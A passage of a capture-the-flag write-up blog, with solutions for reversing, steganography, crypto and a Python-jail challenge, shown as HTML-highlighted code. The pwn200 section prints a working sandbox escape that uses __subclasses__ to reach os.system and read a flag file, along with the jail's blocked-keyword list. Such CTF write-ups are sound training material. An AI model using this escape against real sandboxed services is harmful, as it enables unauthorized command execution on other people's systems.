        <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6a</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x72</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6d</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x79</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x64</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x33</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x78</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x7d</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
    <span class="o">.</span><span class="na">end</span> <span class="n">array</span><span class="o">-</span><span class="n">data</span>
<span class="o">.</span><span class="na">end</span> <span class="n">method</span></code></pre></div>


<p><code>flag{w4nn4_j4r_my_d3x}</code></p>

<h1>rev300 &ldquo;elrond32&rdquo;</h1>

<p>The challenge name was a big hint. Apparently, &lsquo;Elrond&rsquo; is linked to Lord of the Rings. The zip file contains a Linux ELF binary. Upon running the binary, all I got was <code>Access Denied</code>. Disassembling in <code>gdb</code> and analysis showed that the program takes exactly one argument. The length of this string must be exactly 8, no more, no less. The program then starts to compare the values of each byte. It jumps to the relative sections of code using a jumptable. I first did:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>objdump -d rev300 <span class="p">|</span>grep <span class="s2">&quot;cmp &quot;</span>         
 80483b6:   <span class="m">39</span> d8                    cmp    %ebx,%eax
 80483d4:   <span class="m">39</span> d8                    cmp    %ebx,%eax
 8048439:   3c 6e                   cmp    <span class="nv">$0x6e</span>,%al
 8048451:   3c <span class="m">72</span>                    cmp    <span class="nv">$0x72</span>,%al
 8048469:   3c <span class="m">64</span>                    cmp    <span class="nv">$0x64</span>,%al
 804847d:   3c <span class="m">65</span>                    cmp    <span class="nv">$0x65</span>,%al
 8048491:   3c <span class="m">69</span>                    cmp    <span class="nv">$0x69</span>,%al
 80484a5:   3c <span class="m">61</span>                    cmp    <span class="nv">$0x61</span>,%al
 80484b9:   3c <span class="m">67</span>                    cmp    <span class="nv">$0x67</span>,%al
 80484ca:   3c <span class="m">73</span>                    cmp    <span class="nv">$0x73</span>,%al
 8048675:   <span class="m">39</span> fe                    cmp    %edi,%esi
 80486ac:   <span class="m">83</span> f8 ff                 cmp    <span class="nv">$0xffffffff</span>,%eax
 80486bf:   <span class="m">83</span> f8 ff                 cmp    <span class="nv">$0xffffffff</span>,%eax</code></pre></div>


<p>This already narrowed down the possible values for each byte quite a lot! Apparently, the program checks for the byte values &ldquo;sgnrdeia&rdquo;. I looked up the jumptable and started debugging the program.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>x/8x 0x8048720
0x8048720:  0x0804848b  0x08048477  0x080484d5  0x08048433
0x8048730:  0x08048463  0x0804849f  0x080484b3  0x080484c4</code></pre></div>


<p>When I was writing down the values the program was checking against, I was making a mistake and wrote down &lsquo;in.n&rsquo;. I looked at the rest of the letters and for some reason it clicked. I got lucky!</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>./rev300 isengard
Access granted</code></pre></div>


<p><code>flag{s0me7hing_S0me7hinG_t0lki3n}</code></p>

<h1>stego100</h1>

<p>Stego can be extremely hard but also quite fun once you &lsquo;get&rsquo; it. The zip file contained a PNG image showing the three vikings from The Lost Vikings. I did not notice any strange artifacts in the image so I ran <code>strings</code> on the image just to be sure.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>strings stego100
LdfO<span class="p">;</span>
<span class="c">#tEXthint</span>
http://i.imgur.com/22kUrzm.png
IEND</code></pre></div>


<p>Hmm. Another PNG? It looked like the exact same image, but the file sizes differed. I tried to subtract the second image from the first in GIMP but that didn&rsquo;t work. I spent quite some time on it and I finally got it using <code>imagemagick</code>:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">compare 22kUrzm.png stego100 diff.png</code></pre></div>


<p>This created a difference file from both PNGs. This file had a very obvious QR code:</p>

<p><img src="http://barrebas.github.io/assets/stego100-diff.png" alt="" /></p>

<p>Scanning this QR code with a smartphone yielded <code>flag{#justdiffit}</code></p>

<h1>cry100</h1>

<p>The first and easiest crypto challenge. The zip file contained a text file with the following content:</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">XMVZGC RGC AMG RVMG HGFGMQYCD VT VWM BYNO, NSVWDS NSGO RAO XG UWFN AF 
HACDGMVWF. AIRVFN AII AMG JVRRVC-XVMC, FYRBIG TVIZ ESV SAH CGQGM XGGC 
RVMG NSAC A RYIG TMVR NSG SVWFG ESGMG NSGO EGMG XVMC WCNYI NSG HAO 
FVRG IVMH JARG MVWCH NV NAZG NSGR VTT NV EAM. OVWM TIAD YF &quot;CV NSYF 
YF CVN JMOBNV RO HGAM&quot;, YC IVEGMJAFG, EYNS WCHGMFJVMGF YCFNGAH VT 
FBAJGF, FWMMVWCHGH XO NSG WFWAI &quot;TIAD&quot; NAD ACH JWMIO XMAJGF. GCUVO.</code></pre></div>


<p>This looked like either a Caesar cipher or a substitution cipher. Luckily, <a href="http://quipqiup.com/index.php">online solvers</a> exist.</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">BROKEN MEN ARE MORE DESERVING OF OUR PITY, THOUGH THEY MAY BE JUST AS DANGEROUS. ALMOST ALL ARE COMMON-BORN, SIMPLE FOLK WHO HAD NEVER BEEN MORE THAN A MILE FROM THE HOUSE WHERE THEY WERE BORN UNTIL THE DAY SOME LORD CAME ROUND TO TAKE THEM OFF TO WAR. YOUR FLAG IS &#39;NO THIS IS NOT CRYPTO MY DEAR&#39;, IN LOWERCASE, WITH UNDERSCORES INSTEAD OF SPACES, SURROUNDED BY THE USUAL &#39;FLAG&#39; TAG AND CURLY BRACES. ENJOY.</code></pre></div>


<p><code>flag{no_this_is_not_crypto_my_dear}</code></p>

<h1>cry300</h1>

<p>A fun one! I read PoC||GTFO a lot, and the name of the challenge and the file screamed <code>electronic coloring book</code>. For more info, grab a copy of PoC||GTFO 0x05 from a neighbourly neighbour. The idea is that the image file, a 4k still, is encrypted with ECB, but this block cipher is very bad a encrypting. Repeated blocks can be &lsquo;colored&rsquo; in using <a href="https://github.com/doegox/ElectronicColoringBook/blob/master/ElectronicColoringBook.py">this script</a>.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>python colorbook.py -x <span class="m">3840</span> ecb.bmp</code></pre></div>


<p>The image is still a bit mangled, but after flipping the image vertically, the flag is legible:</p>

<p><img src="http://barrebas.github.io/assets/cry300.png" alt="" /></p>

<p><code>flag{no_penguin_here}</code></p>

<h1>pwn200</h1>

<p>A python jail! This reminded me of the CSAW python jail, but simpler. Upon connecting to the ip address, the user is dropped in a python shell. However, we can&rsquo;t use commands that contain</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">prohibited_keywords</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s">&quot;import&quot;</span><span class="p">,</span>
        <span class="s">&quot;open&quot;</span><span class="p">,</span>
        <span class="s">&quot;flag&quot;</span><span class="p">,</span>
        <span class="s">&quot;eval&quot;</span><span class="p">,</span>
        <span class="s">&quot;exec&quot;</span>
    <span class="p">]</span></code></pre></div>


<p>Now, we wanna read the flag somehow. I found <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">this writeup</a> to be very helpful. I followed that approach, abusing <code>().__class__.__base__.__subclasses__()</code> to finally call <code>os</code>. I still have no profound understanding of breaking python jails, but this and the CSAW example definitely helped.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">nc</span> <span class="mf">54.69</span><span class="o">.</span><span class="mf">118.120</span> <span class="mi">6000</span>

<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Safe</span> <span class="n">Interactive</span> <span class="n">CPython</span> <span class="n">Shell</span> <span class="p">(</span><span class="n">SICS</span><span class="p">)</span>
<span class="o">================================================</span>

<span class="n">Rules</span><span class="p">:</span> 
    <span class="o">-</span> <span class="n">Wash</span> <span class="n">your</span> <span class="n">dishes</span>
    <span class="o">-</span> <span class="n">Don</span><span class="s">&#39;t eat the yellow snow</span>
    <span class="o">-</span> <span class="n">Do</span> <span class="ow">not</span> <span class="kn">import</span> <span class="nn">anything</span>
    <span class="o">-</span> <span class="n">No</span> <span class="n">peeking</span> <span class="n">at</span> <span class="n">files</span><span class="err">!</span>

<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
<span class="p">[</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;type&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakref&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakcallableproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;int&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;basestring&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;bytearray&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;list&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;NoneType&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;NotImplementedType&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;traceback&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;super&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;xrange&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;dict&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;set&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;slice&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;staticmethod&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;complex&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;float&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;buffer&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;long&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;frozenset&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;property&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;tuple&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;enumerate&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;reversed&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;code&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;frame&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;builtin_function_or_method&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;instancemethod&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;function&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;classobj&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;dictproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;generator&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;getset_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;wrapper_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;instance&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;ellipsis&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;member_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;sys.floatinfo&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;EncodingMap&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;sys.flags&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;exceptions.BaseException&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;module&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;imp.NullImporter&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;zipimport.zipimporter&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;posix.stat_result&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;posix.statvfs_result&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">warnings</span><span class="o">.</span><span class="n">WarningMessage</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Hashable</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="nb">classmethod</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Iterable</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Sized</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Container</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Callable</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">_Printer</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">_Helper</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="n">pwd</span><span class="o">.</span><span class="n">struct_passwd</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="nb">file</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">Quitter</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">codecs</span><span class="o">.</span><span class="n">IncrementalEncoder</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">codecs</span><span class="o">.</span><span class="n">IncrementalDecoder</span><span class="s">&#39;&gt;]</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="s">&#39;&gt;</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">&quot;linecache&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;cat /home/pybaby/flag&#39;</span><span class="p">)</span>
<span class="c">#rekt</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">&quot;linecache&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;cat /home/pybaby/flag.txt&#39;</span><span class="p">)</span>
<span class="c">#rekt</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">&quot;linecache&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;cat /home/pybaby/f*&#39;</span><span class="p">)</span>    
<span class="n">flag</span><span class="p">{</span><span class="n">python_sandboxing</span><span class="p">:</span><span class="n">_harder_than_teaching_your_mom_dota</span><span class="p">}</span><span class="mi">0</span></code></pre></div>


<p><code>flag{python_sandboxing:_harder_than_teaching_your_mom_dota}</code></p>

<p>I just figured out another way to beat this one, using <code>__builtins__</code>. First, we need to get a way to call <code>open</code> without actually using the phrase &lsquo;open&rsquo;. We can display all the builtin functions like so:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">[</span><span class="s">&#39;bytearray&#39;</span><span class="p">,</span> <span class="s">&#39;IndexError&#39;</span><span class="p">,</span> <span class="s">&#39;all&#39;</span><span class="p">,</span> <span class="s">&#39;help&#39;</span><span class="p">,</span> <span class="s">&#39;vars&#39;</span><span class="p">,</span> <span class="s">&#39;SyntaxError&#39;</span><span class="p">,</span> <span class="s">&#39;unicode&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeDecodeError&#39;</span><span class="p">,</span> <span class="s">&#39;isinstance&#39;</span><span class="p">,</span> <span class="s">&#39;copyright&#39;</span><span class="p">,</span> <span class="s">&#39;NameError&#39;</span><span class="p">,</span> <span class="s">&#39;BytesWarning&#39;</span><span class="p">,</span> <span class="s">&#39;dict&#39;</span><span class="p">,</span> <span class="s">&#39;input&#39;</span><span class="p">,</span> <span class="s">&#39;oct&#39;</span><span class="p">,</span> <span class="s">&#39;bin&#39;</span><span class="p">,</span> <span class="s">&#39;SystemExit&#39;</span><span class="p">,</span> <span class="s">&#39;StandardError&#39;</span><span class="p">,</span> <span class="s">&#39;format&#39;</span><span class="p">,</span> <span class="s">&#39;repr&#39;</span><span class="p">,</span> <span class="s">&#39;sorted&#39;</span><span class="p">,</span> <span class="s">&#39;False&#39;</span><span class="p">,</span> <span class="s">&#39;RuntimeWarning&#39;</span><span class="p">,</span> <span class="s">&#39;list&#39;</span><span class="p">,</span> <span class="s">&#39;iter&#39;</span><span class="p">,</span> <span class="s">&#39;reload&#39;</span><span class="p">,</span> <span class="s">&#39;Warning&#39;</span><span class="p">,</span> <span class="s">&#39;__package__&#39;</span><span class="p">,</span> <span class="s">&#39;round&#39;</span><span class="p">,</span> <span class="s">&#39;dir&#39;</span><span class="p">,</span> <span class="s">&#39;cmp&#39;</span><span class="p">,</span> <span class="s">&#39;set&#39;</span><span class="p">,</span> <span class="s">&#39;bytes&#39;</span><span class="p">,</span> <span class="s">&#39;reduce&#39;</span><span class="p">,</span> <span class="s">&#39;intern&#39;</span><span class="p">,</span> <span class="s">&#39;issubclass&#39;</span><span class="p">,</span> <span class="s">&#39;Ellipsis&#39;</span><span class="p">,</span> <span class="s">&#39;EOFError&#39;</span><span class="p">,</span> <span class="s">&#39;locals&#39;</span><span class="p">,</span> <span class="s">&#39;BufferError&#39;</span><span class="p">,</span> <span class="s">&#39;slice&#39;</span><span class="p">,</span> <span class="s">&#39;FloatingPointError&#39;</span><span class="p">,</span> <span class="s">&#39;sum&#39;</span><span class="p">,</span> <span class="s">&#39;getattr&#39;</span><span class="p">,</span> <span class="s">&#39;abs&#39;</span><span class="p">,</span> <span class="s">&#39;exit&#39;</span><span class="p">,</span> <span class="s">&#39;print&#39;</span><span class="p">,</span> <span class="s">&#39;True&#39;</span><span class="p">,</span> <span class="s">&#39;FutureWarning&#39;</span><span class="p">,</span> <span class="s">&#39;ImportWarning&#39;</span><span class="p">,</span> <span class="s">&#39;None&#39;</span><span class="p">,</span> <span class="s">&#39;hash&#39;</span><span class="p">,</span> <span class="s">&#39;ReferenceError&#39;</span><span class="p">,</span> <span class="s">&#39;len&#39;</span><span class="p">,</span> <span class="s">&#39;credits&#39;</span><span class="p">,</span> <span class="s">&#39;frozenset&#39;</span><span class="p">,</span> <span class="s">&#39;__name__&#39;</span><span class="p">,</span> <span class="s">&#39;ord&#39;</span><span class="p">,</span> <span class="s">&#39;super&#39;</span><span class="p">,</span> <span class="s">&#39;TypeError&#39;</span><span class="p">,</span> <span class="s">&#39;license&#39;</span><span class="p">,</span> <span class="s">&#39;KeyboardInterrupt&#39;</span><span class="p">,</span> <span class="s">&#39;UserWarning&#39;</span><span class="p">,</span> <span class="s">&#39;filter&#39;</span><span class="p">,</span> <span class="s">&#39;range&#39;</span><span class="p">,</span> <span class="s">&#39;staticmethod&#39;</span><span class="p">,</span> <span class="s">&#39;SystemError&#39;</span><span class="p">,</span> <span class="s">&#39;BaseException&#39;</span><span class="p">,</span> <span class="s">&#39;pow&#39;</span><span class="p">,</span> <span class="s">&#39;RuntimeError&#39;</span><span class="p">,</span> <span class="s">&#39;float&#39;</span><span class="p">,</span> <span class="s">&#39;MemoryError&#39;</span><span class="p">,</span> <span class="s">&#39;StopIteration&#39;</span><span class="p">,</span> <span class="s">&#39;globals&#39;</span><span class="p">,</span> <span class="s">&#39;divmod&#39;</span><span class="p">,</span> <span class="s">&#39;enumerate&#39;</span><span class="p">,</span> <span class="s">&#39;apply&#39;</span><span class="p">,</span> <span class="s">&#39;LookupError&#39;</span><span class="p">,</span> <span class="s">&#39;open&#39;</span><span class="p">,</span> <span class="s">&#39;quit&#39;</span><span class="p">,</span> <span class="s">&#39;basestring&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeError&#39;</span><span class="p">,</span> <span class="s">&#39;zip&#39;</span><span class="p">,</span> <span class="s">&#39;hex&#39;</span><span class="p">,</span> <span class="s">&#39;long&#39;</span><span class="p">,</span> <span class="s">&#39;next&#39;</span><span class="p">,</span> <span class="s">&#39;ImportError&#39;</span><span class="p">,</span> <span class="s">&#39;chr&#39;</span><span class="p">,</span> <span class="s">&#39;xrange&#39;</span><span class="p">,</span> <span class="s">&#39;type&#39;</span><span class="p">,</span> <span class="s">&#39;__doc__&#39;</span><span class="p">,</span> <span class="s">&#39;Exception&#39;</span><span class="p">,</span> <span class="s">&#39;tuple&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeTranslateError&#39;</span><span class="p">,</span> <span class="s">&#39;reversed&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeEncodeError&#39;</span><span class="p">,</span> <span class="s">&#39;IOError&#39;</span><span class="p">,</span> <span class="s">&#39;hasattr&#39;</span><span class="p">,</span> <span class="s">&#39;delattr&#39;</span><span class="p">,</span> <span class="s">&#39;setattr&#39;</span><span class="p">,</span> <span class="s">&#39;raw_input&#39;</span><span class="p">,</span> <span class="s">&#39;SyntaxWarning&#39;</span><span class="p">,</span> <span class="s">&#39;compile&#39;</span><span class="p">,</span> <span class="s">&#39;ArithmeticError&#39;</span><span class="p">,</span> <span class="s">&#39;str&#39;</span><span class="p">,</span> <span class="s">&#39;property&#39;</span><span class="p">,</span> <span class="s">&#39;GeneratorExit&#39;</span><span class="p">,</span> <span class="s">&#39;int&#39;</span><span class="p">,</span> <span class="s">&#39;__import__&#39;</span><span class="p">,</span> <span class="s">&#39;KeyError&#39;</span><span class="p">,</span> <span class="s">&#39;coerce&#39;</span><span class="p">,</span> <span class="s">&#39;PendingDeprecationWarning&#39;</span><span class="p">,</span> <span class="s">&#39;file&#39;</span><span class="p">,</span> <span class="s">&#39;EnvironmentError&#39;</span><span class="p">,</span> <span class="s">&#39;unichr&#39;</span><span class="p">,</span> <span class="s">&#39;id&#39;</span><span class="p">,</span> <span class="s">&#39;OSError&#39;</span><span class="p">,</span> <span class="s">&#39;DeprecationWarning&#39;</span><span class="p">,</span> <span class="s">&#39;min&#39;</span><span class="p">,</span> <span class="s">&#39;UnicodeWarning&#39;</span><span class="p">,</span> <span class="s">&#39;execfile&#39;</span><span class="p">,</span> <span class="s">&#39;any&#39;</span><span class="p">,</span> <span class="s">&#39;complex&#39;</span><span class="p">,</span> <span class="s">&#39;bool&#39;</span><span class="p">,</span> <span class="s">&#39;ValueError&#39;</span><span class="p">,</span> <span class="s">&#39;NotImplemented&#39;</span><span class="p">,</span> <span class="s">&#39;map&#39;</span><span class="p">,</span> <span class="s">&#39;buffer&#39;</span><span class="p">,</span> <span class="s">&#39;max&#39;</span><span class="p">,</span> <span class="s">&#39;object&#39;</span><span class="p">,</span> <span class="s">&#39;TabError&#39;</span><span class="p">,</span> <span class="s">&#39;callable&#39;</span><span class="p">,</span> <span class="s">&#39;ZeroDivisionError&#39;</span><span class="p">,</span> <span class="s">&#39;eval&#39;</span><span class="p">,</span> <span class="s">&#39;__debug__&#39;</span><span class="p">,</span> <span class="s">&#39;IndentationError&#39;</span><span 